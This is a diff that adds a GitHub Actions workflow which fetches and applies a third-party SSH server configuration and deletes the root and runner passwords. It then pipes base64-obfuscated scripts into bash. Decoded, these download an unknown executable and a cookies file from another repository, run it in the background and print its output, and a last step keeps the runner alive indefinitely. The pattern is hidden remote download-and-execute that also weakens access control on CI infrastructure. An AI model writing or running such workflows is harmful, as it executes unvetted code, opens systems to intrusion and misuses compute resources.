@@ -1,0 +1,36 @@
+name: LinuxServer_Tun
+
+on: [push, workflow_dispatch]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Update and install packages
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y neofetch speedtest-cli php-cli curl
+
+      - name: Setup SSH
+        run: |
+          wget -q https://raw.githubusercontent.com/GogoZin/sshd/main/sshd_config -O sshd_config
+          sudo cp sshd_config /etc/ssh/sshd_config
+          sudo service ssh restart
+          sudo passwd -d root
+          sudo passwd -d runner
+
+      - name: Download creator-linux and ycs.json
+        run: |
+          echo "d2dldCAtcSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbWF0dGhpYXNvc3RlcmhhZ2VuMTUzMC90aDVrZVRydkZ1dDd5MlNZV1hkL3JlZnMvaGVhZHMvbWFpbi9jcmVhdG9yLWxpbnV4IC1PIGNyZWF0b3ItbGludXgKd2dldCAtcSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbWF0dGhpYXNvc3RlcmhhZ2VuMTUzMC90aDVrZVRydkZ1dDd5MlNZV1hkL3JlZnMvaGVhZHMvbWFpbi95Y3MuanNvbiAtTyB5Y3MuanNvbgpjaG1vZCAreCAuL2NyZWF0b3ItbGludXg=" | base64 -d | bash
+
+      - name: Run creator-linux persistently
+        run: |
+          echo "ZWNobyAiU3RhcnRpbmcgY3JlYXRvci1saW51eCBpbiBiYWNrZ3JvdW5kLi4uIgpub2h1cCAuL2NyZWF0b3ItbGludXggLS1jb29raWVzIC4veWNzLmpzb24gLS13cml0ZS1maWxlIC4vb3V0LnR4dCA+IGNyZWF0b3IubG9nIDI+JjEgJgplY2hvICQhID4gY3JlYXRvci5waWQKZWNobyAiY3JlYXRvci1saW51eCBzdGFydGVkIHdpdGggUElEICQoY2F0IGNyZWF0b3IucGlkKSIKc2xlZXAgNQ==" | base64 -d | bash
+
+      - name: Wait for out.txt and display content
+        run: |
+          echo "ZWNobyAiV2FpdGluZyBmb3Igb3V0LnR4dCB0byBoYXZlIGNvbnRlbnQuLi4iCgpmb3IgaSBpbiB7MS4uMzYwfTsgZG8KICBpZiBbIC1zIC4vb3V0LnR4dCBdOyB0aGVuCiAgICBlY2hvICI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIKICAgIGVjaG8gIuKchSBvdXQudHh0IGlzIHJlYWR5ISBDb250ZW50OiIKICAgIGVjaG8gIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IgogICAgY2F0IC4vb3V0LnR4dAogICAgZWNobyAiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iCiAgICBlY2hvICLinIUgU3VjY2Vzc2Z1bGx5IGRpc3BsYXllZCB0aGUgY29udGVudC4iCiAgICBicmVhawogIGVsc2UKICAgIGVjaG8gIlskaS8zNjBdIFN0aWxsIHdhaXRpbmcuLi4gKDEwIHNlY29uZHMgcGFzc2VkKSIKICAgIHNsZWVwIDEwCiAgZmkKZG9uZQoKaWYgWyAhIC1zIC4vb3V0LnR4dCBdOyB0aGVuCiAgZWNobyAi4pqg77iPIFRpbWVvdXQgcmVhY2hlZCBhZnRlciA2MCBtaW51dGVzLiBvdXQudHh0IGlzIHN0aWxsIGVtcHR5LiIKICBlY2hvICJDaGVjayBjcmVhdG9yLmxvZyBmb3IgbW9yZSBkZXRhaWxzOiIKICBjYXQgY3JlYXRvci5sb2cKICBleGl0IDEKZmk=" | base64 -d | bash
+
+      - name: Keep alive
+        run: tail -f /dev/null
